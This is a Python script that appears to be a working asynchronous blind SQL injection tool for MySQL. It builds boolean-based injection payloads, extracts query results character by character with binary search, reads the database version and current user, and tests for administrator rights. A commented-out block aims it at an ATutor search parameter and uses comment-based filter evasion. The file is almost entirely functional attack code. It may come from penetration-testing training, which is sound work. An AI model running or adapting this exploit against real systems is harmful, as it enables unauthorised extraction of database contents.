import asyncio
from email.mime import base
from urllib import response
from collections.abc import Callable
import aiohttp
from typing import List, Iterable
try:
    import uvloop
    uvloop.install()
except:
    pass

COMMENT="%23"
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"

QUERIES = {
    'DB_VERSION': "select version()",
    'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
    'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
    'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
    'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1",
}

async def run_until_found(tasklist: List):
    """Run all generated tasks until value is returned, cancel the rest"""
    tasks = asyncio.as_completed(tasklist)

    for future in tasks:
        response = await future
        if response:
            break
    map(lambda x: x.cancel(), tasks)
    return response

async def blind_query(session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
                      url:str, base_query:Callable[[str],str], sub_query:str, ordinal:str = "",
                      query_encoder:Callable[[str], str]=None, debug:bool=False
                      ):
    target = query_encoder(base_query(url,sub_query, COMMENT)) if query_encoder else base_query(url, sub_query, COMMENT)
    try:
        async with session.get(target) as res:
            if debug == True:
                print("target: ", target)
                print("response headers: ", res.headers)
                print("response: ", res.content)
            if (response_truth_condition(res)):
                return ordinal if ordinal else True
            return False
    except aiohttp.client_exceptions.ServerDisconnectedError:
        return False
async def question(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        return await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder)
async def get_length(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        cr_length = [
            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['LENGTH_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
            for i in range(lower_bound, upper_bound)
        ]
        strlen = int(await run_until_found(cr_length))
        try:
            return strlen
        except:
            print(F"(+) Could not determine length of subquery [{sub_query}].")
            exit(1)
async def get_count(url:str, base_query:Callable[[str],str], sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 0, upper_bound: int = 1000, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        cr_count = [
            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['COUNT_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
            for i in range(lower_bound, upper_bound)
        ]
        count = int(await run_until_found(cr_count))
        try:
            return count
        except:
            print(F"(+) Could not determine count of subquery [{sub_query}].")
            exit(1)
async def binary_search(url:str, session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lo, hi, base_query:Callable[[str],str], sub_query, position, query_encoder:Callable[[str], str]=None):
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        res = await blind_query(session=session, response_truth_condition=response_truth_condition, url=url, base_query=base_query, sub_query=QUERIES['STR_EXFIL'](sub_query,position,mid),ordinal=mid,query_encoder=query_encoder)
        if (res):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo
async def get_string(url:str, base_query:Callable[[str],str], sub_query:str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], strlen: int, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        tasks = [
            binary_search(url=url, session=session, response_truth_condition=response_truth_condition, lo=32, hi=126, base_query=base_query, sub_query=sub_query, position=i, query_encoder=query_encoder)
            for i in range(1, strlen+1)
        ]
        s = list(await asyncio.gather(*tasks))
        s = [chr(c) for c in s]
        s = "".join(s)
        try:
            return s
        except:
            print(F"(+) Could not exfil string with subquery [{sub_query}].")
            exit(1)
async def report(url:str, base_query:Callable[[str],str], response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], query_encoder:Callable[[str], str]=None):
    version_strlen = await get_length(url, base_query=base_query, sub_query="select version()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
    print("(+) DB Version strlen: ", version_strlen)
    print(F"(+) MySQL Version: {await get_string(url, base_query=base_query, sub_query='select version()', response_truth_condition=response_truth_condition, strlen=version_strlen, query_encoder=query_encoder)}")
    db_user_strlen = await get_length(url, base_query=base_query, sub_query="select current_user()", response_truth_condition=response_truth_condition, query_encoder=query_encoder)
    print("(+) Current DB User strlen: ", db_user_strlen)
    db_user = await  get_string(url, base_query=base_query, sub_query="select current_user()", response_truth_condition=response_truth_condition, strlen=db_user_strlen, query_encoder=query_encoder)
    print(F"(+) Current DB User: {db_user}")
    print(F"(+) Current User is DB Admin?: {await question(url, base_query=base_query, sub_query=QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user),  response_truth_condition=response_truth_condition, query_encoder=query_encoder)}")
    '''
    num_tables = await get_count(url, "SELECT COUNT(table_name) FROM information_schema.tables", query_encoder=query_encoder)
    print(num_tables)
    table_name_lengths = []
    tables = []
    for i in range (0, num_tables):
        table_name_lengths.append(await get_length(url, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", query_encoder=query_encoder))
        print(i, ":", table_name_lengths[i])
        tables.append(await get_string(url, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i], query_encoder=query_encoder))
        print(tables[i], ":", table_name_lengths[i])
    '''
'''
# here we specify the condition that lets us infer the result of a query from the response 
def response_truth_condition(response): 
    content_length = int(response.headers['Content-Length'])
    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
try:
    asyncio.run(report("http://atutor/ATutor/mods/_standard/social/index_public.php?q=", base_query=blind_sqli_truthy,response_truth_condition=response_truth_condition, query_encoder=lambda s: s.replace(' ','/**/')))
# https://github.com/MagicStack/uvloop/issues/349
except NotImplementedError:
    pass
'''